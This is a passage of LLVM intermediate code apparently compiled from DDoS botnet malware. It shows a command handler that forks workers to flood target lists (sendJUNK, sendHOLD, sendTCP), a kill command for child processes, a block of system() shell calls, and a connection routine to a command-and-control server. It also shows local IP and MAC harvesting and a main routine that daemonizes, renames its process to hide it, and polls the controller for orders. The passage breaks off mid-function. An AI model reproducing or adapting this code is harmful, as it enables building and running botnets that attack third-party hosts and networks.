  %457 = call i32 @strcmp(i8* %456, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i64 0, i64 0)) #11
  %458 = icmp ne i32 %457, 0
  br i1 %458, label %523, label %459

459:                                              ; preds = %453
  %460 = load i32, i32* %3, align 4
  %461 = icmp slt i32 %460, 4
  br i1 %461, label %474, label %462

462:                                              ; preds = %459
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #11
  %467 = icmp slt i32 %466, 1
  br i1 %467, label %474, label %468

468:                                              ; preds = %462
  %469 = load i8**, i8*** %4, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 3
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 @atoi(i8* %471) #11
  %473 = icmp slt i32 %472, 1
  br i1 %473, label %474, label %475

474:                                              ; preds = %468, %462, %459
  br label %693

475:                                              ; preds = %468
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 1
  %478 = load i8*, i8** %477, align 8
  store i8* %478, i8** %26, align 8
  %479 = load i8**, i8*** %4, align 8
  %480 = getelementptr inbounds i8*, i8** %479, i64 2
  %481 = load i8*, i8** %480, align 8
  %482 = call i32 @atoi(i8* %481) #11
  store i32 %482, i32* %27, align 4
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 3
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @atoi(i8* %485) #11
  store i32 %486, i32* %28, align 4
  %487 = load i8*, i8** %26, align 8
  %488 = call i8* @strstr(i8* %487, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #11
  %489 = icmp ne i8* %488, null
  br i1 %489, label %490, label %511

490:                                              ; preds = %475
  %491 = load i8*, i8** %26, align 8
  %492 = call i8* @strtok(i8* %491, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %492, i8** %29, align 8
  br label %493

493:                                              ; preds = %508, %490
  %494 = load i8*, i8** %29, align 8
  %495 = icmp ne i8* %494, null
  br i1 %495, label %496, label %510

496:                                              ; preds = %493
  %497 = call i32 @listFork()
  %498 = icmp ne i32 %497, 0
  br i1 %498, label %508, label %499

499:                                              ; preds = %496
  %500 = load i8*, i8** %29, align 8
  %501 = load i32, i32* %27, align 4
  %502 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %500, i32 %501, i32 %502)
  %503 = load i8*, i8** %29, align 8
  %504 = load i32, i32* %27, align 4
  %505 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %503, i32 %504, i32 %505)
  %506 = load i32, i32* @mainCommSock, align 4
  %507 = call i32 @close(i32 %506)
  call void @_exit(i32 0) #14
  unreachable

508:                                              ; preds = %496
  %509 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %509, i8** %29, align 8
  br label %493, !llvm.loop !55

510:                                              ; preds = %493
  br label %522

511:                                              ; preds = %475
  %512 = call i32 @listFork()
  %513 = icmp ne i32 %512, 0
  br i1 %513, label %514, label %515

514:                                              ; preds = %511
  br label %693

515:                                              ; preds = %511
  %516 = load i8*, i8** %26, align 8
  %517 = load i32, i32* %27, align 4
  %518 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %516, i32 %517, i32 %518)
  %519 = load i8*, i8** %26, align 8
  %520 = load i32, i32* %27, align 4
  %521 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %519, i32 %520, i32 %521)
  call void @_exit(i32 0) #14
  unreachable

522:                                              ; preds = %510
  br label %523

523:                                              ; preds = %522, %453
  %524 = load i8**, i8*** %4, align 8
  %525 = getelementptr inbounds i8*, i8** %524, i64 0
  %526 = load i8*, i8** %525, align 8
  %527 = call i32 @strcmp(i8* %526, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #11
  %528 = icmp ne i32 %527, 0
  br i1 %528, label %634, label %529

529:                                              ; preds = %523
  %530 = load i32, i32* %3, align 4
  %531 = icmp slt i32 %530, 6
  br i1 %531, label %562, label %532

532:                                              ; preds = %529
  %533 = load i8**, i8*** %4, align 8
  %534 = getelementptr inbounds i8*, i8** %533, i64 3
  %535 = load i8*, i8** %534, align 8
  %536 = call i32 @atoi(i8* %535) #11
  %537 = icmp eq i32 %536, -1
  br i1 %537, label %562, label %538

538:                                              ; preds = %532
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 2
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* %541) #11
  %543 = icmp eq i32 %542, -1
  br i1 %543, label %562, label %544

544:                                              ; preds = %538
  %545 = load i32, i32* %3, align 4
  %546 = icmp sgt i32 %545, 5
  br i1 %546, label %547, label %553

547:                                              ; preds = %544
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 5
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @atoi(i8* %550) #11
  %552 = icmp slt i32 %551, 0
  br i1 %552, label %562, label %553

553:                                              ; preds = %547, %544
  %554 = load i32, i32* %3, align 4
  %555 = icmp eq i32 %554, 7
  br i1 %555, label %556, label %563

556:                                              ; preds = %553
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 6
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @atoi(i8* %559) #11
  %561 = icmp slt i32 %560, 1
  br i1 %561, label %562, label %563

562:                                              ; preds = %556, %547, %538, %532, %529
  br label %693

563:                                              ; preds = %556, %553
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 1
  %566 = load i8*, i8** %565, align 8
  store i8* %566, i8** %30, align 8
  %567 = load i8**, i8*** %4, align 8
  %568 = getelementptr inbounds i8*, i8** %567, i64 2
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @atoi(i8* %569) #11
  store i32 %570, i32* %31, align 4
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 3
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @atoi(i8* %573) #11
  store i32 %574, i32* %32, align 4
  %575 = load i8**, i8*** %4, align 8
  %576 = getelementptr inbounds i8*, i8** %575, i64 4
  %577 = load i8*, i8** %576, align 8
  store i8* %577, i8** %33, align 8
  %578 = load i32, i32* %3, align 4
  %579 = icmp eq i32 %578, 7
  br i1 %579, label %580, label %585

580:                                              ; preds = %563
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 6
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @atoi(i8* %583) #11
  br label %586

585:                                              ; preds = %563
  br label %586

586:                                              ; preds = %585, %580
  %587 = phi i32 [ %584, %580 ], [ 10, %585 ]
  store i32 %587, i32* %34, align 4
  %588 = load i32, i32* %3, align 4
  %589 = icmp sgt i32 %588, 5
  br i1 %589, label %590, label %595

590:                                              ; preds = %586
  %591 = load i8**, i8*** %4, align 8
  %592 = getelementptr inbounds i8*, i8** %591, i64 5
  %593 = load i8*, i8** %592, align 8
  %594 = call i32 @atoi(i8* %593) #11
  br label %596

595:                                              ; preds = %586
  br label %596

596:                                              ; preds = %595, %590
  %597 = phi i32 [ %594, %590 ], [ 0, %595 ]
  store i32 %597, i32* %35, align 4
  store i32 32, i32* %36, align 4
  %598 = load i8*, i8** %30, align 8
  %599 = call i8* @strstr(i8* %598, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #11
  %600 = icmp ne i8* %599, null
  br i1 %600, label %601, label %621

601:                                              ; preds = %596
  %602 = load i8*, i8** %30, align 8
  %603 = call i8* @strtok(i8* %602, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %603, i8** %37, align 8
  br label %604

604:                                              ; preds = %618, %601
  %605 = load i8*, i8** %37, align 8
  %606 = icmp ne i8* %605, null
  br i1 %606, label %607, label %620

607:                                              ; preds = %604
  %608 = call i32 @listFork()
  %609 = icmp ne i32 %608, 0
  br i1 %609, label %618, label %610

610:                                              ; preds = %607
  %611 = load i8*, i8** %37, align 8
  %612 = load i32, i32* %31, align 4
  %613 = load i32, i32* %32, align 4
  %614 = load i8*, i8** %33, align 8
  %615 = load i32, i32* %35, align 4
  %616 = load i32, i32* %34, align 4
  %617 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %611, i32 %612, i32 %613, i8* %614, i32 %615, i32 %616, i32 %617)
  call void @_exit(i32 0) #14
  unreachable

618:                                              ; preds = %607
  %619 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %619, i8** %37, align 8
  br label %604, !llvm.loop !56

620:                                              ; preds = %604
  br label %633

621:                                              ; preds = %596
  %622 = call i32 @listFork()
  %623 = icmp ne i32 %622, 0
  br i1 %623, label %624, label %625

624:                                              ; preds = %621
  br label %693

625:                                              ; preds = %621
  %626 = load i8*, i8** %30, align 8
  %627 = load i32, i32* %31, align 4
  %628 = load i32, i32* %32, align 4
  %629 = load i8*, i8** %33, align 8
  %630 = load i32, i32* %35, align 4
  %631 = load i32, i32* %34, align 4
  %632 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %626, i32 %627, i32 %628, i8* %629, i32 %630, i32 %631, i32 %632)
  call void @_exit(i32 0) #14
  unreachable

633:                                              ; preds = %620
  br label %634

634:                                              ; preds = %633, %523
  %635 = load i8**, i8*** %4, align 8
  %636 = getelementptr inbounds i8*, i8** %635, i64 0
  %637 = load i8*, i8** %636, align 8
  %638 = call i32 @strcmp(i8* %637, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.106, i64 0, i64 0)) #11
  %639 = icmp ne i32 %638, 0
  br i1 %639, label %671, label %640

640:                                              ; preds = %634
  store i32 0, i32* %38, align 4
  store i64 0, i64* %39, align 8
  br label %641

641:                                              ; preds = %667, %640
  %642 = load i64, i64* %39, align 8
  %643 = load i64, i64* @numpids, align 8
  %644 = icmp ult i64 %642, %643
  br i1 %644, label %645, label %670

645:                                              ; preds = %641
  %646 = load i32*, i32** @pids, align 8
  %647 = load i64, i64* %39, align 8
  %648 = getelementptr inbounds i32, i32* %646, i64 %647
  %649 = load i32, i32* %648, align 4
  %650 = icmp ne i32 %649, 0
  br i1 %650, label %651, label %666

651:                                              ; preds = %645
  %652 = load i32*, i32** @pids, align 8
  %653 = load i64, i64* %39, align 8
  %654 = getelementptr inbounds i32, i32* %652, i64 %653
  %655 = load i32, i32* %654, align 4
  %656 = call i32 @getpid() #12
  %657 = icmp ne i32 %655, %656
  br i1 %657, label %658, label %666

658:                                              ; preds = %651
  %659 = load i32*, i32** @pids, align 8
  %660 = load i64, i64* %39, align 8
  %661 = getelementptr inbounds i32, i32* %659, i64 %660
  %662 = load i32, i32* %661, align 4
  %663 = call i32 @kill(i32 %662, i32 9) #12
  %664 = load i32, i32* %38, align 4
  %665 = add nsw i32 %664, 1
  store i32 %665, i32* %38, align 4
  br label %666

666:                                              ; preds = %658, %651, %645
  br label %667

667:                                              ; preds = %666
  %668 = load i64, i64* %39, align 8
  %669 = add i64 %668, 1
  store i64 %669, i64* %39, align 8
  br label %641, !llvm.loop !57

670:                                              ; preds = %641
  br label %671

671:                                              ; preds = %670, %634
  %672 = load i8**, i8*** %4, align 8
  %673 = getelementptr inbounds i8*, i8** %672, i64 0
  %674 = load i8*, i8** %673, align 8
  %675 = call i32 @strcmp(i8* %674, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.107, i64 0, i64 0)) #11
  %676 = icmp ne i32 %675, 0
  br i1 %676, label %678, label %677

677:                                              ; preds = %671
  call void @exit(i32 0) #16
  unreachable

678:                                              ; preds = %671
  %679 = load i8**, i8*** %4, align 8
  %680 = getelementptr inbounds i8*, i8** %679, i64 0
  %681 = load i8*, i8** %680, align 8
  %682 = call i32 @strcmp(i8* %681, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.108, i64 0, i64 0)) #11
  %683 = icmp ne i32 %682, 0
  br i1 %683, label %693, label %684

684:                                              ; preds = %678
  %685 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i64 0, i64 0))
  %686 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i64 0, i64 0))
  %687 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i64 0, i64 0))
  %688 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i64 0, i64 0))
  %689 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i64 0, i64 0))
  %690 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i64 0, i64 0))
  %691 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i64 0, i64 0))
  %692 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i64 0, i64 0))
  br label %693

693:                                              ; preds = %45, %54, %68, %80, %95, %100, %105, %132, %167, %194, %231, %279, %331, %361, %365, %410, %447, %474, %514, %562, %624, %684, %678
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 4096, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #12
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* %26, i32 58) #11
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* %30, i32 58) #11
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #11
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* %34, i32 58) #11
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #12
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i64 0, i64 0)) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #12
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i64 0, i64 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i64 0, i64 0)) #11
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !58

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !59

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #12
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #12
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !60

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0)
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i64 0, i64 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i64 0, i64 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #11
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.123, i64 0, i64 0), i64 %33) #12
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i64 0, i64 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %41 = call i32 @getpid() #12
  %42 = xor i32 %40, %41
  call void @srand(i32 %42) #12
  %43 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %44 = call i32 @getpid() #12
  %45 = xor i32 %43, %44
  call void @init_rand(i32 %45)
  %46 = call i32 @getOurIP()
  %47 = call i32 @fork() #12
  store i32 %47, i32* %7, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %52

49:                                               ; preds = %2
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #16
  unreachable

52:                                               ; preds = %2
  %53 = load i32, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %66, label %55

55:                                               ; preds = %52
  %56 = call i32 @fork() #12
  store i32 %56, i32* %8, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %55
  call void @exit(i32 0) #16
  unreachable

59:                                               ; preds = %55
  %60 = load i32, i32* %8, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %63, label %62

62:                                               ; preds = %59
  br label %64

63:                                               ; preds = %59
  br label %64

64:                                               ; preds = %63, %62
  br label %65

65:                                               ; preds = %64
  br label %67

66:                                               ; preds = %52
  br label %67

67:                                               ; preds = %66, %65
  br label %68

68:                                               ; preds = %67
  %69 = call i32 @setsid() #12
  %70 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0)) #12
  %71 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #12
  br label %72

72:                                               ; preds = %68, %75, %365
  %73 = call i32 @initConnection()
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %75, label %77

75:                                               ; preds = %72
  %76 = call i32 @sleep(i32 5)
  br label %72

77:                                               ; preds = %72
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i8* @getBuild()
  %80 = call i32 (i32, i8*, ...) @sockprintf(i32 %78, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i64 0, i64 0), i8* %79)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %81

81:                                               ; preds = %364, %286, %208, %170, %77
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %84 = call i32 @recvLine(i32 %82, i8* %83, i32 4096)
  store i32 %84, i32* %11, align 4
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %365

86:                                               ; preds = %81
  store i32 0, i32* %12, align 4
  br label %87

87:                                               ; preds = %158, %86
  %88 = load i32, i32* %12, align 4
  %89 = sext i32 %88 to i64
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  br i1 %91, label %92, label %161

92:                                               ; preds = %87
  %93 = load i32*, i32** @pids, align 8
  %94 = load i32, i32* %12, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @waitpid(i32 %97, i32* null, i32 1)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %157

100:                                              ; preds = %92
  %101 = load i32, i32* %12, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %14, align 4
  br label %103

103:                                              ; preds = %119, %100
  %104 = load i32, i32* %14, align 4
  %105 = zext i32 %104 to i64
  %106 = load i64, i64* @numpids, align 8
  %107 = icmp ult i64 %105, %106
  br i1 %107, label %108, label %122

108:                                              ; preds = %103
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %14, align 4
  %111 = zext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
